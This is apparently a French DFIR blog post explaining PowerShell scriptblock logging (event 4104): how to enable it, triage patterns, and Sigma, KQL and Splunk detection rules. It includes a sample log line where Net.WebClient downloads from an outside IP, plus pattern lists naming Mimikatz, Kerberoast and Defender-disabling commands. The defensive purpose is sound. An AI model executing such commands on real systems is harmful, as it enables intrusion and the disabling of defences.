---
title: "PowerShell Event ID 4104 expliqué : scriptblock logging pour DFIR"
description: "Le scriptblock logging est le contrôle défensif gratuit le plus utile de Windows. Il enregistre le corps complet du script, y compris ceux obfusqués ou en mémoire, sous l'événement 4104."
date: "2026-05-17"
---

Quand le scriptblock logging de PowerShell est activé, le moteur enregistre le corps de chaque script qui s'exécute. Commandes interactives, scripts chargés depuis le disque, tout ce qui est réfléchi en mémoire par `Invoke-Expression` ou `IEX`. L'enregistrement atterrit dans `Microsoft-Windows-PowerShell%4Operational.evtx` comme event ID **4104**, "Creating Scriptblock text".

Si vous n'avez pas d'EDR, c'est ce que la plateforme vous donne de plus proche. Activez-le. Le coût est négligeable et l'avantage est tout ce que PowerShell essaie de cacher.

## Ce que vous obtenez

```xml
<Data Name="MessageNumber">1</Data>
<Data Name="MessageTotal">1</Data>
<Data Name="ScriptBlockText">$wc = New-Object Net.WebClient; $wc.DownloadString('http://203.0.113.5/a')</Data>
<Data Name="ScriptBlockId">{guid}</Data>
<Data Name="Path">C:\Users\alice\Downloads\setup.ps1</Data>
```

Pour un script long, PowerShell divise le corps sur plusieurs enregistrements 4104, un par `MessageNumber`. Les recoller ensemble est essentiel. Les fragments sont faciles à mal lire, et un attaquant qui connaît le scriptblock logging va délibérément remplir des lignes pour qu'une correspondance partielle sur un seul enregistrement paraisse bénigne.

## Comment l'activer

`HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging\EnableScriptBlockLogging = 1`. Ou la Group Policy à *Computer Configuration / Administrative Templates / Windows Components / Windows PowerShell / Turn on PowerShell Script Block Logging*. Il n'y a pas de coût côté PowerShell qui vaille d'être mesuré. Activez-le partout.

Tant que vous y êtes, activez aussi Module Logging et transcription. Module Logging (4103) vous donne les valeurs de paramètres par invocation. La transcription écrit la session console rendue dans un fichier que vous pouvez expédier. Chacun attrape une tranche différente. Aucun ne se substitue à 4104.

## Ce que 4104 attrape que rien d'autre ne fait

Le moteur PowerShell logge le script *après* tout encodage, compression ou réflexion en mémoire. Cela signifie :

- Une invocation `-EncodedCommand` logge à la fois le launcher encodé (dans le [4688](/en/blog/event-id-4688-process-creation) correspondant ou [Sysmon 1](/en/blog/sysmon-event-id-1-process-create)) et le corps décodé (dans 4104).
- Un script qui télécharge et fait `Invoke-Expression` sur un payload distant logge le corps *exécuté*, pas le wrapper.
- Un attaquant utilisant des bypasses AMSI laisse quand même l'enregistrement 4104. Le bypass affecte le scan, pas le logging. Le bypass lui-même apparaît souvent comme des lignes 4104 contenant `amsiInitFailed` ou `amsiScanBuffer`.

C'est le contrôle défensif gratuit le plus utile sur la plateforme. Les défenseurs qui n'ont pas d'EDR ont généralement ça.

## Triager 4104 à grande échelle

Les patterns à fort signal dans un corpus d'enregistrements 4104 :

- `DownloadString`, `DownloadFile`, `Invoke-WebRequest`, `Net.WebClient`. Récupération de contenu distant.
- `IEX`, `Invoke-Expression`. Exécution dynamique.
- `FromBase64String`, `[System.Convert]::FromBase64String`. Payload encodé.
- `Add-MpPreference -ExclusionPath`. Tampering de Defender.
- `Set-MpPreference -DisableRealtimeMonitoring`. Tampering de Defender.
- `[System.Reflection.Assembly]::Load`, `[Reflection.Emit]`. Chargement d'assembly en mémoire.
- `Invoke-Mimikatz`, `Invoke-Kerberoast`, `Invoke-BloodHound`, `DCSync`. Outillage offensif connu.

Une seule correspondance à elle seule n'est pas toujours malveillante (les admins utilisent aussi `DownloadString`). Les combinaisons le sont. Pivotez de 4104 vers le [Sysmon event 1](/en/blog/sysmon-event-id-1-process-create) ou [4688](/en/blog/event-id-4688-process-creation) correspondant par timestamp + processus pour récupérer le contexte complet d'invocation.

## Sigma : outillage offensif PowerShell

```yaml
title: Suspicious PowerShell Scriptblock - Offensive Tool Indicators
id: 4f1a3b8d-2c5e-4d8f-9a3b-1c2d3e4f5a6b
status: stable
description: PowerShell scriptblock body contains strings characteristic of offensive tooling, encoded payloads, or in-memory reflection.
references:
  - https://attack.mitre.org/techniques/T1059/001/
  - https://attack.mitre.org/techniques/T1027/
logsource:
  product: windows
  service: powershell
  category: ps_script
detection:
  selection_offensive:
    EventID: 4104
    ScriptBlockText|contains:
      - 'Invoke-Mimikatz'
      - 'Invoke-Kerberoast'
      - 'Invoke-BloodHound'
      - 'Invoke-DCSync'
      - 'New-PSInjection'
      - 'Get-PassHashes'
  selection_reflective:
    EventID: 4104
    ScriptBlockText|contains:
      - 'System.Reflection.Assembly]::Load'
      - '[Reflection.Emit]'
      - 'FromBase64String'
  selection_defender_tamper:
    EventID: 4104
    ScriptBlockText|contains:
      - 'Set-MpPreference -DisableRealtimeMonitoring'
      - 'Add-MpPreference -ExclusionPath'
      - 'Set-MpPreference -DisableIOAVProtection'
  condition: selection_offensive or selection_reflective or selection_defender_tamper
falsepositives:
  - Defenders running known offensive tooling for testing (whitelist by host)
  - Software installers using reflection for legitimate purposes
level: high
tags:
  - attack.execution
  - attack.t1059.001
  - attack.defense_evasion
```

## KQL : PowerShell encodé depuis un utilisateur à bas privilèges

```kusto
let encoded =
    Event
    | where Source == "Microsoft-Windows-PowerShell" and EventID == 4104
    | extend XmlData = parse_xml(EventData)
    | extend ScriptBlockText = tostring(XmlData.EventData.Data[2])
    | where ScriptBlockText contains "FromBase64String"
       or ScriptBlockText matches regex @"\b-e(?:nc|ncodedcommand)?\b\s"
    | project TimeGenerated, Computer, UserId=tostring(XmlData.System.Security["@UserID"]), ScriptBlockText;
encoded
| where UserId !startswith "S-1-5-18"   // exclude LocalSystem
   and UserId !startswith "S-1-5-19"
   and UserId !startswith "S-1-5-20"
| order by TimeGenerated desc
```

## Splunk : tampering de Defender depuis PowerShell

```spl
index=powershell EventCode=4104
   ( ScriptBlockText="*Set-MpPreference*DisableRealtimeMonitoring*"
     OR ScriptBlockText="*Add-MpPreference*ExclusionPath*"
     OR ScriptBlockText="*Set-MpPreference*DisableIOAVProtection*" )
| table _time host UserID ScriptBlockText
```

## Mapping ATT&CK

- T1059.001 Command and Scripting Interpreter : PowerShell. Chaque 4104 offensif se mappe ici. PowerShell est l'une des techniques d'exécution les plus citées dans les intrusions modernes.
- T1027 Obfuscated Files or Information. Patterns Encoded, Base64, `FromBase64String`.
- T1140 Deobfuscate/Decode Files or Information. Le moteur logge la forme *décodée*, qui est la valeur que 4104 fournit par rapport à [4688](/en/blog/event-id-4688-process-creation).
- T1562.001 Impair Defenses : Disable or Modify Tools. `Set-MpPreference -DisableRealtimeMonitoring`, `Add-MpPreference -ExclusionPath`.
- T1003.001 LSASS Memory. Patterns `Invoke-Mimikatz`, `MiniDump`, `comsvcs.dll` dans les corps de script.
- T1558.003 Kerberoasting. Patterns `Invoke-Kerberoast`, Rubeus kerberoast.

## Faux positifs qui ressemblent exactement à des attaques

- Les runbooks d'admin utilisent parfois `Invoke-Expression` légitimement pour de la configuration en template. La combinaison est généralement courte, répétable, et depuis des sessions admin connues.
- Les scripts de gestion de Defender (IT d'entreprise) appellent `Set-MpPreference` légitimement pour pousser des listes d'exclusion. Whitelistez par certificat de signature du script ou SID d'hôte.
- Chocolatey, WinGet, installateurs de paquets utilisent du PowerShell Base64-encodé légitimement. Pattern : court, en journée, depuis des hôtes de build ou d'admin.
- L'activité red-team ou pentest aura l'air identique à de vraies attaques. Coordonnez les fenêtres d'engagement et taguez les IPs source des opérateurs.

## L'angle mort

4104 logge le *corps* du script. Il ne logge pas l'exécution par instruction, les retours de fonction ou les valeurs de variables. Pour ça il vous faut 4103 (Module logging) ou un vrai EDR. 4104 vous dit ce qui a tourné. Le reste vous dit ce qu'il a fait.

Si 4104 était désactivé quand l'attaque s'est produite (le cas le plus commun que je vois sur des incidents dans des parcs datés), le corps du script est parti. L'invocation wrapper pourrait encore être dans [4688](/en/blog/event-id-4688-process-creation), l'empreinte binaire dans [AmCache](https://www.amcacheparser.com), et le répertoire de travail dans [prefetch](https://www.prefetchparser.com), mais le code réel est perdu sauf si vous pouvez le carver depuis [pagefile.sys](https://www.pagefilesysparser.com) ou un [dump RAM](https://www.ramparser.com). Activez-le maintenant pour ne pas avoir cet argument avec vous-même la prochaine fois.

## Pour aller plus loin

- [Documentation Microsoft : PowerShell script block logging](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows)
- [FireEye/Mandiant : Greater Visibility Through PowerShell Logging](https://www.mandiant.com/resources/blog/greater-visibility)
- [Daniel Bohannon : Invoke-Obfuscation et détection](https://github.com/danielbohannon/Invoke-Obfuscation)
